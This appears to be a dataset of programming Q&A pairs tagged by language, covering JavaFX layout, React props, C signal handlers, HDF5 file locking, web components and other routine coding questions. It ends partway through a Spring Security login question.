I've created my own component, but the layout of children doesn't work. When scrolling, one can see the light red background from the BorderPane, but the label background and the text of the label are not rendered at all.
Any ideas?
import javafx.application.Application;
import javafx.scene.Scene;
import javafx.scene.control.Label;
import javafx.scene.control.ScrollPane;
import javafx.scene.layout.BorderPane;
import javafx.scene.layout.Pane;
import javafx.scene.layout.StackPane;
import javafx.stage.Stage;

public class VirtualNodesDemo extends Application {
    @Override
    public void start(Stage primaryStage) {
        int virtualNodes = 100;
        double nodeWidth = 100;
        double nodeHeight = 100;

        StackPane root = new StackPane();

        Pane content = new Pane() {
            @Override
            protected void layoutChildren() {
                System.out.println(""content.layoutChildren() ..."");

                getChildren().clear();

                ScrollPane scrollPane = (ScrollPane) getParent().getParent().getParent();

                double viewportHeight = scrollPane.getViewportBounds().getHeight();
                double scrollTop = scrollPane.getVvalue() * (getPrefHeight() - viewportHeight);

                double y = 0;

                for (int i = 0; i < virtualNodes; i++) {
                    if (y + nodeHeight > scrollTop && y < scrollTop + viewportHeight) {
                        Pane pane = createRealNode(i);
                        pane.resizeRelocate(10, y, nodeWidth, nodeHeight);
                        pane.layout();
                        getChildren().add(pane);
                    } else {
                        break;
                    }
                    y += nodeHeight + 10;
                }

                setPrefHeight(y);
            }

            private Pane createRealNode(int i) {
                BorderPane borderPane = new BorderPane();
                borderPane.setManaged(false);
                Label label = new Label(""Node "" + i);
                label.setStyle(""-fx-background-color: #aaf;"");
                borderPane.setCenter(label);
                borderPane.setStyle(""-fx-background-color: #faa;"");
                return borderPane;
            }
        };

        ScrollPane scrollPane = new ScrollPane(content);
        scrollPane.setFitToWidth(true);
        scrollPane.setVbarPolicy(ScrollPane.ScrollBarPolicy.ALWAYS);
        scrollPane.vvalueProperty().addListener(observable -> content.layout());
        root.getChildren().add(scrollPane);

        Scene scene = new Scene(root, 800, 600);
        primaryStage.setScene(scene);
        primaryStage.show();
    }
    
    public static void main(String[] args) {
        launch(args);
    }
}

When changing createRealNode as below, the label and label text are shown as expected. However, I need to be able to use BorderPane (and related, like StackPane, GridPane) because the nodes I need to render are quite big and have a lot of children/sub-panes.
            private Pane createRealNode(int i) {
                Label label = new Label(""Node "" + i);
                label.setStyle(""-fx-background-color: #aaf;"");
                Pane p = new Pane();
                p.setManaged(false);
                p.getChildren().add(label);
                return p;
            }

","I agree with all the comments mentioned. Don't reinvent the wheel !!
To deal with virtualization, it is not as simple as you think . Think for altering your approach to model(data objects) your items and then you can use ListView to use cell factories to render the nodes.
For the quick fix what you are encountering with, include pane.applyCss(); after you add the pane to the children. This will fix your issue and the label will be displayed in the BorderPane. But as said, this is very wrong approach.
Pane pane = createRealNode(i);
pane.resizeRelocate(10, y, nodeWidth, nodeHeight);
pane.layout();
getChildren().add(pane); 
pane.applyCss();

You can think of something like below as I mentioned above using ListView approach: (just to give you some idea how to approach)

import javafx.application.Application;
import javafx.collections.FXCollections;
import javafx.collections.ObservableList;
import javafx.scene.Scene;
import javafx.scene.control.Label;
import javafx.scene.control.ListCell;
import javafx.scene.control.ListView;
import javafx.scene.layout.BorderPane;
import javafx.scene.layout.StackPane;
import javafx.stage.Stage;

public class VirtualNodesDemo_Update extends Application {
    private final static String CSS = ""data:text/css,"" +
            """"""
                .list-view .list-cell{
                    -fx-background-color: transparent !important;
                }
    """""";
    double nodeWidth = 100;
    double nodeHeight = 100;

    @Override
    public void start(Stage primaryStage) {
        ObservableList<DataDetails> data = FXCollections.observableArrayList();
        for(int i=0;i<100;i++){
            data.add(new DataDetails(""Node ""+i, ""#aaf"", ""#faa"", nodeWidth, nodeHeight));
        }
        ListView<DataDetails> listView = new ListView<>();
        listView.setItems(data);
        listView.setMaxWidth(Double.MAX_VALUE);
        listView.setMaxHeight(Double.MAX_VALUE);
        listView.setCellFactory(param -> new CustomListCell());

        StackPane root = new StackPane();
        root.getChildren().add(listView);
        Scene scene = new Scene(root, 800, 600);
        scene.getStylesheets().add(CSS);
        primaryStage.setScene(scene);
        primaryStage.show();
    }
    
    public static void main(String[] args) {
        launch(args);
    }

    class CustomListCell extends ListCell<DataDetails>{

        BorderPane pane;
        Label label;

        public CustomListCell(){
            /* Build the structure as you like...*/
            pane = new BorderPane();
            label = new Label();
            pane.setCenter(label);
        }

        @Override
        protected void updateItem(DataDetails item, boolean empty) {
            super.updateItem(item, empty);
            if(item!=null && !empty){
                label.setText(item.getTitle());
                pane.setPrefSize(item.getWidth(), item.getHeight());
                pane.setMaxSize(item.getWidth(), item.getHeight());
                label.setStyle(""-fx-background-color: ""+item.getLabelBg());
                pane.setStyle(""-fx-background-color: ""+item.getDataBg());
                setGraphic(pane);
            }else{
                setGraphic(null);
            }
        }
    }
    class DataDetails{
        String title;
        String labelBg;
        String dataBg;
        double width;
        double height;

        /* Build your data object with all the details that you need to render.. */
        public DataDetails(String title, String labelBg, String dataBg, double width, double height) {
            this.title = title;
            this.labelBg = labelBg;
            this.dataBg = dataBg;
            this.width = width;
            this.height = height;
        }

        public String getTitle() {
            return title;
        }

        public String getLabelBg() {
            return labelBg;
        }

        public String getDataBg() {
            return dataBg;
        }

        public double getWidth() {
            return width;
        }

        public double getHeight() {
            return height;
        }
    }
}

",java
how to pass an icon as a prop,"I'm using props and I want to have ""optionText"" and ""optionIcon"" the 1st one I'm able to add but I'm not able to implement an icon as a prop
File where I'm creating props
import Icon from ""@mui/material/Icon"";

function HeaderMenuOptions({ optionText, OptionIcon }) {
  return (
    <div className=""flex items-center text-center"">
      <Icon>{OptionIcon}</Icon>
      <h1 className=""py-1 my-1 hover:bg-menu-option-hover hover:text-black cursor-pointer"">
        {optionText}
      </h1>
    </div>
  );
}

export default HeaderMenuOptions;


file where I'm using said props
        <div className=""absolute left-72 top-3 rounded-md bg-section w-[10rem] text-center"">
          <p className=""menu-header mt-2"">VIEW OPTIONS</p>

          <div className=""flex items-center justify-center space-x-2 mr-2 cursor-pointer hover:bg-menu-option-hover hover:hover:text-black group"">
            <HeaderMenuOptions optionText=""Night Mode"" />
            <CheckBoxIcon
              defaultChecked
              onClick={() => alert(""Light mode has not been added yet!"")}
              className=""cursor-pointer text-blue-500""
            />
          </div>

          <p className=""menu-header"">MORE STUFF</p>
          <HeaderMenuOptions optionText=""Premium"" OptionIcon={SecurityIcon} />
          <HeaderMenuOptions optionText=""TEST"" />
          <HeaderMenuOptions optionText=""TEST"" />
          <HeaderMenuOptions optionText=""TEST"" />
          <HeaderMenuOptions optionText=""TEST"" />
        </div>

can anyone please help me. Thanks
","The HeaderMenuOptions looks fine. You need to change the parent component.
You can do something like this.
<HeaderMenuOptions optionText=""Premium"" OptionIcon={<SecurityIcon />} />

",javascript
what does void mean in c c and c,"Looking to get the fundamentals on where the term ""void"" comes from, and why it is called void. The intention of the question is to assist someone who has no C experience, and is suddenly looking at a C-based codebase. 
","Basically it means ""nothing"" or ""no type""
There are 3 basic ways that void is used:

Function argument: int myFunc(void)
-- the function takes nothing. 
Function return value: void myFunc(int)
-- the function returns nothing
Generic data pointer: void* data
-- 'data' is a pointer to data of unknown type, and cannot be dereferenced

Note: the void in a function argument is optional in C++, so int myFunc() is exactly the same as int myFunc(void), and it is left out completely in C#. It is always required for a return value.
",c
how to reference a json array using an api,"I would to refer to the description field in the weather array using the getDescription function
""weather"": [
    {
        ""id"": 600,
        ""main"": ""Snow"",
        ""description"": ""light snow"",
        ""icon"": ""13d""
    }
],

public String getDescription() {
String description = String.valueOf(obj.getJSONArray(""weather""));
String jObj = String.valueOf(obj.getJSONObject(""description""));
return jObj;

How to write correctly getDescription functions to get the description value from the Weather array?
","You need to get the weather Array from obj, then retrieve the item you want from the array, then the description.
public String getDescription() {
    JsonArray weatherArray = obj.getJsonArray(""weather"");
    JsonObject weatherObject = weatherArray.getJsonObject(0);
    return weatherObject.getString(""description"");
}

This method is not validating anything for simplicity, but keep in mind and implement the appropriate checks for when any of those objects is null or if the weather array is empty.
",java
change making algorithm,"A typical Change Making problem but a bit twisted. Given a large amount and the denominations given, I need to come up with total number of ways in which the amount can be made using RECURSION. The signature of the function is as follows
int makeChange(int Amount, int[] Denominations)
Amount-Total Amount
Denominations- The available denominatins.
It returns total number of ways.. make sure this has to be  done Using Recursion..
","The key idea is to understand at each point you have two choices:

Use the current coin you are looking at, and recurse when decreasing it from amount.
Don't use it, and make it unavailable for later selection.

The function should return the summation of (1) and (2).
Pseudo-code:
makeChange(amount,Denominations):
   //stop clauses:
   if (amount == 0) return 1
   if (amount < 0) return 0
   i <- first index of Denominations where Denominations[i] is not zero
   if there is no such i (all are zero):
        return 0
   num1 = makeChange(amount-Denominations[i],Denominations) //recursive call, using Denominations[i]
   temp <- Denominations[i]
   Denominations[i] = 0
   num2 = makeChange(amount,Denominations) //recursive call, not using Denominations[i] - and will never do again
   Denominations[i] = temp //setting environment back to original
   return num1+num2

java code:
public static int makeChange(int amount, int[] d) { 
    if (amount < 0) return 0;
    if (amount == 0) return 1;
    int i = 0;
    for (i = 0; i < d.length; i++) { 
        if (d[i] != 0) break;
    }
    if (i == d.length) return 0;
    int num1 = makeChange(amount-d[i],d);
    int temp = d[i];
    d[i] = 0;
    int num2 = makeChange(amount,d);
    d[i] = temp;
    return num1 + num2;
}

",java
compile gcc for armv7l from debian in linux,"I'm using GCC version 10.2.1 in Linux Debian (x86-64).
I write this C code:
#include <stdio.h>

int main() {
  printf(""Hello World!"");
  return 0;
}

Now my question is how can I compile and run this code for armv7l?
Target system Is a evaluation board
","you can use arm-linux-gnueabihf-gcc hello.c -o hello command. And before you should install arm-linux-gnueabihf-gcc in your linux system .
here is full sample that work for me
",c
strange behaviour of ww simpledateformat,"Can anyone explain why do I get those values while trying to parse a date?
I've tried three different inputs, as follows:
1) Third week of 2013
Date date = new SimpleDateFormat(""ww.yyyy"").parse(""02.2013"");
Calendar cal = Calendar.getInstance();
cal.setTime(date);
System.out.println(cal.get(Calendar.WEEK_OF_YEAR) + ""."" + cal.get(Calendar.YEAR));

Which outputs: 02.2013 (as I expected)
2) First week of 2013
Date date = new SimpleDateFormat(""ww.yyyy"").parse(""00.2013"");
Calendar cal = Calendar.getInstance();
cal.setTime(date);
System.out.println(cal.get(Calendar.WEEK_OF_YEAR) + ""."" + cal.get(Calendar.YEAR));

Which outputs: 52.2012 (which is fine for me, since the first week of 2013 is also the last one of 2012)
3) Second week of 2013
Date date = new SimpleDateFormat(""ww.yyyy"").parse(""01.2013"");
Calendar cal = Calendar.getInstance();
cal.setTime(date);
System.out.println(cal.get(Calendar.WEEK_OF_YEAR) + ""."" + cal.get(Calendar.YEAR));

Which outputs: 1.2012 (which makes absolutely no sense to me)
Does anyone know why this happens?? I need to parse a date in the format (week of year).(year). Am I using the wrong pattern?
","You're using ww, which is ""week of week-year"", but then yyyy which is ""calendar year"" rather than ""week year"". Setting the week-of-week-year and then setting the calendar year is a recipe for problems, because they're just separate numbering systems, effectively.
You should be using YYYY in your format string to specify the week-year... although unfortunately it looks like you can't then get the value in a sane way. (I'd expect a Calendar.WEEKYEAR constant, but there is no such thing.)
Also, week-of-year values start at 1, not 0... and no week is in two week-years; it's either the first week of 2013 or it's the last week of 2012... it's not both.
I would personally avoid using week-years and weeks if you possibly can - they can be very confusing, particularly when a date in one calendar year is in a different week year.
",java
detect northern or southern hemisphere with momentjs,"Someone previously asked how to detect hemispheres  and the accepted answer was this:
window.whatHemisphere= (function(){
    var y= new Date().getFullYear();
    if(y.getTimezoneOffset()==undefined) return null;
    var jan= -(new Date(y, 0, 1, 0, 0, 0, 0).getTimezoneOffset()),
    jul= -(new Date(y, 6, 1, 0, 0, 0, 0).getTimezoneOffset()),
    diff= jan-jul;
    if(diff> 0) return 'N';
    if(diff< 0) return 'S'
    return null;
})()

However, if I'm using Moment.js and Moment Timezone, is there a method that's more reliable than this using the tools provided by these libraries?
","No, there's nothing built in to moment to give you a north/south hemisphere for a user.
Also, the function you showed is always going to return null because getTimezoneOffset is on Date, but y is just a number.
Even if you called it on a Date, DST is not observed by all countries of the world.  In fact, according to Wikipedia, DST is not observed in the majority of the world.
The only bit that makes sense is that if (and only if) a location observes DST, countries in the northern hemisphere will be in DST when July is in their summer, and countries in the southern hemisphere will be in DST when January is in their summer.
",javascript
elementtypelocal_variable annotation type,"I`d like to create my own annotations to annotate some local variable. To write the annotation is not the problem, the problem is to get the information of them at the Runtime. I could only get some information from annotated methods or method parameters, but not from local variables. Is there any way to get it? 
My own annotation is something like that:
public void m(int a)  
@MyOwnAnnotation(some information)  
int b = 5;  
}  

Or, as an alternative, is there any way to get the code of the method, to parse it further and finally get annotation value?
Thanks in advance.
","With reflection you can't retrieve a local variable. So you can't retrieve an annotation on a local variable via reflection. I think that this kind of annotation is only used for compiler warnings.
You can look http://www.eclipse.org/aspectj/doc/released/adk15notebook/annotations.html

Local variable annotations are not retained in class files (or at runtime) regardless of the retention policy set on the annotation type. See JLS 9.6.1.2.

If you wan't to retrieve method code, you can use JavaParser (http://javaparser.org/).
",java
unable to open h5 files during runtime of c program,"I am writing a simulation in C, and want to output the data during runtime to .h5 files using the HDF5 library. The following code is used to output the files:
void output_data(int t, int n_output) {
    char filename[32];
    sprintf(filename, ""data_%d.h5"", n_output);
    hid_t hdf5_fp = H5Fcreate(filename, H5F_ACC_TRUNC, H5P_DEFAULT, H5P_DEFAULT);

    hid_t group_id = H5Gcreate2(hdf5_fp, ""/data"", H5P_DEFAULT, H5P_DEFAULT, H5P_DEFAULT);

    hsize_t dim_1d[1] = {1};
    hid_t dataspace_id_1d = H5Screate_simple(1, dim_1d, NULL);
    hsize_t dims[2] = {NX, NY};
    hid_t dataspace_id = H5Screate_simple(2, dims, NULL);

    hid_t dataset_id;
    dataset_id = H5Dcreate2(group_id, ""time"", H5T_NATIVE_INT32, dataspace_id_1d, H5P_DEFAULT, H5P_DEFAULT, H5P_DEFAULT);
    H5Dwrite(dataset_id, H5T_NATIVE_INT32, H5S_ALL, H5S_ALL, H5P_DEFAULT, &t);
    
    // Output of other data

    H5Sclose(dataspace_id_1d);
    H5Sclose(dataspace_id);
    H5Dclose(dataset_id);
    H5Gclose(group_id);
    H5Fclose(hdf5_fp);
}

I link statically with the hdf5 library using:
gcc main.c -o main -std=c17 -O3 -Wall -Wextra -I/usr/local/hdf5/include -L/usr/local/hdf5/lib -l:libhdf5.a -lm -lz

And I could also link with the shared library using:
gcc main.c -o main -std=c17 -O3 -Wall -Wextra -I/usr/local/hdf5/include -L/usr/local/hdf5/lib -Wl,-rpath /usr/local/hdf5/lib -l:libhdf5.so -lm -lz

If I want to read out the .h5 files during runtime using the h5py library in python, I get the following error:
BlockingIOError: [Errno 11] Unable to synchronously open file (unable to lock file, errno = 11, error message = 'Resource temporarily unavailable')

And if I abort the simulation during runtime, I get the following error when reading out the .h5 files:
OSError: Unable to synchronously open file (bad object header version number)

As far as I know, I am closing the .h5 files correctly in the C code. What could be causing these problems?
","Both issues of being unable to open files during runtime and corrupted files when aborting the program can be fixed by adding H5Fflush(hdf5_fp, H5F_SCOPE_GLOBAL); before the close functions. Found this with the help of ChatGPT, thanks Stack Overflow!
",python
create webcomponent through createelement,"I'm having an issue creating a Web Component using createElement. I'm getting this error:
Uncaught DOMException: Failed to construct 'CustomElement': The result must not have children
at appendTodo
class TodoCard extends HTMLElement {
    constructor() {
        super()

        this.innerHTML = `
            <li>
                <div class=""card"">
                    <span class=""card-content"">${this.getAttribute('content')}</span>
                    <i class=""fa fa-circle-o"" aria-hidden=""true""></i>
                    <i class=""fa fa-star-o"" aria-hidden=""true""></i>
                </div>
            </li>
        `
    }
}

window.customElements.define('todo-card', TodoCard)

const todoList = document.getElementById('todo-list')
const todoForm = document.getElementById('todo-form')
const todoInput = document.getElementById('todo-input')

function appendTodo(content) {
    const todo = document.createElement('todo-card')
    todo.setAttribute('content', content)
    todoList.appendChild(todo)
}

todoForm.addEventListener('submit', e => {
    e.preventDefault()
    appendTodo(todoInput.value)
    todoInput.value = ''
})

any ideas?
Thanks.
","A Custom Element (JSWC) that sets DOM content in the constructor
can never be created with document.createElement()
You will see many examples (including from me) where DOM content is set in the constructor.
Those Elements can never be created with document.createElement
Explanation (HTML DOM API):
When you use:
  <todo-card content=FOO></todo-card>

The element (extended from HTMLElement) has all the HTML interfaces (it is in a HTML DOM),
and you can set the innerHTML in the constructor
But, when you do:
  document.createElement(""todo-card"");

The constructor runs, without HTML interfaces (the element may have nothing to do with a DOM),
thus setting innerHTML in the constructor produces the error:

Uncaught DOMException: Failed to construct 'CustomElement': The result must not have children

From https://html.spec.whatwg.org/multipage/custom-elements.html#custom-element-conformance:

The element must not gain any attributes or children, as this violates the expectations of consumers who use the createElement or createElementNS methods.
In general, work should be deferred to connectedCallback as much as possible

shadowDOM is a DOM
When using shadowDOM you can set shadowDOM content in the constructor:
  constructor(){
    super().attachShadow({mode:""open""})
           .innerHTML = `...`;
  }

Correct code (for no shadowDOM!): use the connectedCallback:


<todo-card content=FOO></todo-card>

<script>
  customElements.define(
    ""todo-card"",
    class extends HTMLElement {
      constructor() {
        super();
        //this.innerHTML = this.getAttribute(""content"");
      }
      connectedCallback() {
        this.innerHTML = this.getAttribute(""content"");
      }
    }
  );

  try {
    const todo = document.createElement(""todo-card"");
    todo.setAttribute(""content"", ""BAR"");
    document.body.appendChild(todo);
  } catch (e) {
    console.error(e);
  }
</script>



You have another minor issue: content was a default attribute, and FireFox won't stop warning you:

Or don't use createElement
  const todo = document.createElement(""todo-card"");
  todo.setAttribute(""content"", ""BAR"");
  document.body.appendChild(todo);

can be written as:
  const html = `<todo-card content=""BAR""></todo-card`;
  document.body.insertAdjacentHTML(""beforeend"" , html); 

The connectedCallback can run multiple times!
When you move DOM nodes around:


<div id=DO_Learn>
  <b>DO Learn: </b><todo-card todo=""Custom Elements API""></todo-card>
</div>
<div id=""DONT_Learn"">
  <b>DON'T Learn!!! </b><todo-card todo=""React""></todo-card>
</div>
<script>
  customElements.define(
    ""todo-card"",
    class extends HTMLElement {
      connectedCallback() {
        let txt = this.getAttribute(""todo"");
        this.append(txt);// and appended again on DOM moves
        console.log(""qqmp connectedCallback\t"", this.parentNode.id, this.innerHTML);
      }
      disconnectedCallback() {
        console.log(""disconnectedCallback\t"", this.parentNode.id , this.innerHTML);
      }
    }
  );
  const LIT = document.createElement(""todo-card"");
  LIT.setAttribute(""todo"", ""Lit"");
  DO_Learn.append(LIT);
  DONT_Learn.append(LIT);
</script>




connectedCallback runs for LIT
when LIT is moved
disconnectedCallback runs (note the parent! The Element is already in the new location)
connectedCallback for LIT runs again, appending ""Learn Lit"" again

It is up to you the programmer how your component/application must handle this
Web Component Libraries
Libraries like Lit, HyperHTML and Hybrids have extra callbacks implemented that help with all this.
I advice to learn the Custom Elements API first, otherwise you are learning a tool and not the technology.
And a Fool with a Tool, is still a Fool
Also read my Dev.to post on the connectedCallback:
https://dev.to/dannyengelman/web-component-developers-do-not-connect-with-the-connectedcallback-yet-4jo7
",javascript
how to avoid using printf in a signal handler,"Since printf is not reentrant, it's not supposed to be safe to use it in a signal handler. But I've seen lots of example codes that uses printf this way.
So my question is: when do we need to avoid using printf in a signal handler, and is there a recommended replacement?
","You can use some flag variable, set that flag inside signal handler, and based on that flag call printf() function in main() or other part of program during normal operation. 

It is not safe to call all functions, such as printf, from within a signal handler. 
     A useful technique is to use a signal handler to set a flag and then check that flag
     from the main program and print a message if required.   

Notice in example below, signal handler ding() set a flag alarm_fired to 1 as SIGALRM caught and in main function alarm_fired value is examined to conditionally call printf correctly. 
static int alarm_fired = 0;
void ding(int sig) // can be called asynchronously
{
  alarm_fired = 1; // set flag
}
int main()
{
    pid_t pid;
    printf(""alarm application starting\n"");
    pid = fork();
    switch(pid) {
        case -1:
            /* Failure */
            perror(""fork failed"");
            exit(1);
        case 0:
            /* child */
            sleep(5);
            kill(getppid(), SIGALRM);
            exit(0);
    }
    /* if we get here we are the parent process */
    printf(""waiting for alarm to go off\n"");
    (void) signal(SIGALRM, ding);
    pause();
    if (alarm_fired)  // check flag to call printf
      printf(""Ding!\n"");
    printf(""done\n"");
    exit(0);
}

 Reference: Beginning Linux Programming, 4th Edition, In this book exactly your code is explained (what you want), Chapter 11: Processes and Signals, page 484 
Additionally, you need to take special care in writing handler functions because they can be called asynchronously. That is, a handler might be called at any point in the program, unpredictably. If two signals arrive during a very short interval, one handler can run within another. And It is considered better practice to declare volatile sigatomic_t, this type are always accessed atomically, avoid uncertainty about interrupting access to a variable. (read: Atomic Data Access and Signal Handling for detail expiation). 
Read Defining Signal Handlers :to learn how to write a signal handler function that can be established with the signal() or sigaction() functions.
List of authorized functions in manual page, calling this function inside signal handler is safe.
",c
enum type warning in c,"I am writing a code on lpc1788 ARM Cortex M3. I came across a strange warning when I tried to configure the ports as GPIO.
Despite of the warning, the code works absolutely fine, but to learn why this warning come, I am putting forward this post here.
Following is the code that I have written. 
static uint32_t * PIN_GetPointer(uint8_t portnum, uint8_t pinnum)  
{  
    uint32_t *pPIN = NULL;  
    pPIN = (uint32_t *)(LPC_IOCON_BASE + ((portnum * 32 + pinnum)*sizeof(uint32_t)));  
    return pPIN;  
}    

void PINSEL_SetPinMode ( uint8_t portnum, uint8_t pinnum, PinSel_BasicMode modenum)  
{  
    uint32_t *pPIN = NULL;  
    pPIN = PIN_GetPointer(portnum, pinnum);  
    *(uint32_t *)pPIN &= ~(3<<3);    //Clear function bits  
    *(uint32_t *)pPIN |= (uint32_t)(modenum<<3);  
}  

int main(void)  
{  
    PINSEL_SetPinMode(1,15,0);  //this gave a warning: enumerated type mixed with another type  
    PINSEL_SetPinMode(1,18,PINSEL_BASICMODE_NPLU_NPDN);    //this doesnt give any warning  

   /* Following is the enum present in a GPIO related header file, putting it here in comments so that   
       those who are going through this post, can see the enum  

            typedef enum
            {
                PINSEL_BASICMODE_NPLU_NPDN  = 0, // Neither Pull up nor pull down        
                PINSEL_BASICMODE_PULLDOWN,       // Pull-down enabled
                PINSEL_BASICMODE_PULLUP,         // Pull-up enabled (default)         
                PINSEL_BASICMODE_REPEATER        // Repeater mode          
            }PinSel_BasicMode;        
   */

    return 0;  
}     

","You are using int type where enum PinSel_BasicMode type is required. While enums and ints are usually interchangeable, they are different types.
Value 0 is not an enum value. PINSEL_BASICMODE_NPLU_NPDN is. It is only 0 through definition.
Should the enum declaration change and PINSEL_BASICMODE_NPLU_NPDN was equal to 1, your code would be invalid.
",c
jinja2 print to console or logging,"I'm kind of new to Jinja2 and am wondering if there is a way to make the templates, while being generated, to print to the console or redirect some output to some kind of stream?
Since Jinja2 templates may have logic inside, I think it would be useful sometimes to log some info in to some kind of logfile, or at least get printed to console.
Is this possible or am I just talking garbage?
","I think you can achieve it using filters (http://jinja.pocoo.org/docs/api/#custom-filters) or extensions (http://jinja.pocoo.org/docs/extensions/#adding-extensions). The idea is to just print the filter or extension straight to console.
Not tested but the filter should be something like:
def debug(text):
  print text
  return ''

environment.filters['debug']=debug

To be used as:
...<p>Hello world!</p> {{""debug text!""|debug}}...

Remember to remove the debug on production code!
",python
when are debug symbols included,"In which phase of compilation process are the debug symbols actually generated.
If I compile a object file with -g option, than does it makes imperative that whatever object file may be built into (shared lib, static lib, executable), the output will always have debug symbols in it ?
if don't specify the -g during linking, will the output binary will have debug symbols or not ?
","
Every relocatable object file has a symbol table in .symtab section, which includes the information about functions and global variables that are defined and referenced in the program. However, unlike the symbol table insider a compiler, the .symtab symbol table does not contain entries for local variables.
-g enables use of extra debugging information, e.g. line number. As David pointed out, the default behavior depends on compiler and platforms.
You can refer to this page for more detail.

",c
springboot not triggering custom authentication for my loaduserbyusername method,"I was implementing an authentication mechanism for my app.
So, if the user is admin and correct username and password is provided, then user should be authenticated and home page should be displayed to the admin. But in my case, even when correct username and password is provided, even in that case the control is redirected to login page instead of home page.
Below are the further details:-
login page:-
<!DOCTYPE html>
<html lang=""en"">
<head>
  <meta charset=""UTF-8"">
  <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
  <meta http-equiv=""X-UA-Compatible"" content=""ie=edge"">
  <title>Login & Registration Form | CoderGirl</title>
  <link rel=""stylesheet"" href=""style.css"">
</head>
<body>
  <div class=""container"">
    <input type=""checkbox"" id=""check"">
    <div class=""login form"">
      <header>Login</header>
      <form action=""/home"" method=""POST"">
        <input type=""text"" name=""username"" placeholder=""Enter your email"" required>
        <input type=""password"" name=""password"" placeholder=""Enter your password"" required>
        <a href=""#"">Forgot password?</a>
        <input type=""submit"" class=""button"" value=""Login"">
      </form>
      <div class=""signup"">
        <span class=""signup"">Don't have an account?
         <label for=""check"">Signup</label>
        </span>
      </div>
    </div>
    <div class=""registration form"">
      <header>Signup</header>
      <form action=""/register"" method=""POST"">
        <input type=""text"" name=""username"" placeholder=""Enter your email"" required>
        <input type=""password"" name=""password"" placeholder=""Create a password"" required>
        <input type=""password"" name=""confirmPassword"" placeholder=""Confirm your password"" required>
        <input type=""submit"" class=""button"" value=""Signup"">
      </form>
      <div class=""signup"">
        <span class=""signup"">Already have an account?
         <label for=""check"">Login</label>
        </span>
      </div>
    </div>
  </div>
</body>
</html>

home page:-
<!DOCTYPE html>
<html lang=""en"">
<head>
  <meta charset=""UTF-8"">
  <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
  <meta http-equiv=""X-UA-Compatible"" content=""ie=edge"">
  <title>Product Management</title>
  <link rel=""stylesheet"" href=""home_style.css"">
</head>
<body>
  <div class=""container"">
    <h1>Welcome to the Product Management System</h1>
    <div class=""button-container"">
      <button class=""action-button"" onclick=""window.location.href='/add-product'"">Add Product</button>
      <button class=""action-button"" onclick=""window.location.href='/remove-product'"">Remove Product</button>
      <button class=""action-button"" onclick=""window.location.href='/modify-product'"">Modify Product</button>
      <button class=""action-button"" onclick=""window.location.href='/view-product'"">View Product</button>
    </div>
    <a href=""/logout"" class=""logout-button"">Logout</a>
  </div>
</body>
</html>

controller:-
@Controller
public class LoginController {

    @Autowired
    private UserService userService;
    
    @Autowired
    private CustomUserDetailsService customservice;

    @Autowired
    private PasswordEncoder passwordEncoder;
    
    @GetMapping(""/login"")
    public String loginPage() {
        return ""index""; // Render the login.html page
    }
    
    @GetMapping(""/logout"")
    public String logoutPage() {
        return ""index""; // Render the logout.html page
    }

    @PostMapping(""/home"")
    public String login(@RequestParam String username, @RequestParam String password) {
        // Retrieve user from the database
        System.out.println(""login endpoint"");
        User user = userService.findByUsername(username);
      
        Iterator<Role> iterator = user.getRoles().iterator();
        while (iterator.hasNext()) {
            Role fruit = iterator.next();
            System.out.println(fruit.getRoleName());
        }
        
        if (user != null && passwordEncoder.matches(password, user.getPassword())) {
            System.out.println(""authentication complete"");
            return ""home"";  // Password matches, redirect to home
        } else {
            System.out.println(""authentication incomplete"");
            return ""index"";  // Invalid login, return to login page
        }
    }
    }

This is my security config:-
@Configuration
@EnableWebSecurity
public class SecurityConfig {

    @Autowired
    private CustomUserDetailsService customUserDetailsService; // Inject the custom user details service

    @Bean
    public PasswordEncoder passwordEncoder() {
        System.out.println(""inside password encoder"");
        return new BCryptPasswordEncoder(); // Passwords should be hashed using BCrypt
    }

    @Bean
    public DaoAuthenticationProvider authenticationProvider() {
        System.out.println(""inside authentication provider"");
        DaoAuthenticationProvider authProvider = new DaoAuthenticationProvider();
        authProvider.setUserDetailsService(customUserDetailsService); // Use injected CustomUserDetailsService
        authProvider.setPasswordEncoder(passwordEncoder()); // Set password encoder
        return authProvider;
    }

    @Bean
    public AuthenticationManager authenticationManager(AuthenticationConfiguration authenticationConfiguration) throws Exception {
        System.out.println(""inside authentication manager"");
        return authenticationConfiguration.getAuthenticationManager();
    }

    
    
    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        System.out.println(""inside securityFilterChain"");
        http
            .authorizeHttpRequests()
            .requestMatchers(""/css/**"", ""/js/**"", ""/images/**"", ""/static/**"").permitAll()
            .requestMatchers(""/login"", ""/register"", ""*.css"").permitAll() // Public access to login and register
            .requestMatchers(""/add-product"", ""/modify-product"", ""/remove-product"").hasRole(""ADMIN"") // Restrict product modification to ADMIN roles
            .requestMatchers(""/view-product"").authenticated() // Requires users to be authenticated
            .anyRequest().authenticated() // All other requests need to be authenticated
            .and()
            .formLogin()
                .loginPage(""/login"")
                .defaultSuccessUrl(""/home"", true) // Redirect to home after login
                .failureUrl(""/login"") 
            .and()
            .logout()
                .logoutSuccessUrl(""/logout"") // Redirect after logout
                .permitAll()
            .and()
            .sessionManagement() // Configure session management
                .sessionCreationPolicy(SessionCreationPolicy.IF_REQUIRED) // Default policy
                .maximumSessions(1) // Limit the number of concurrent sessions per user
                .expiredUrl(""/login?expired"") // Redirect to login page if session expires
            .and()
            .and()
            .csrf().disable(); // Disable CSRF for non-browser clients or API access

        return http.build();
    }
}

custom userdetailservice:-
@Service
public class CustomUserDetailsService implements UserDetailsService {

    @Autowired
    private UserRepository userRepository;

    public CustomUserDetailsService() {
        System.out.println(""CustomUserDetailsService has been initialized."");
    }
    
    
    // Map roles to authorities, adding 'ROLE_' prefix
    private Collection<? extends GrantedAuthority> mapRolesToAuthorities(Collection<Role> roles) {
        return roles.stream()
                    .map(role -> new SimpleGrantedAuthority(role.getRoleName()))
                    .collect(Collectors.toList());
    }


    @Override
    public UserDetails loadUserByUsername(String username) throws UsernameNotFoundException {
        System.out.println(""inside loaduserbyusername custom user"");
        User user = userRepository.findByUsername(username);
        System.out.println(""User is ""+user.getUsername() +"" and password is ""+user.getPassword());
        if (user == null) {
            throw new UsernameNotFoundException(""User not found"");
        }
        org.springframework.security.core.userdetails.User springUser = new org.springframework.security.core.userdetails.User(
                user.getUsername(),
                user.getPassword(),
                mapRolesToAuthorities(user.getRoles())
        );
        System.out.println(""Spring Security User Details: "");
        System.out.println(""Username: "" + springUser.getUsername());
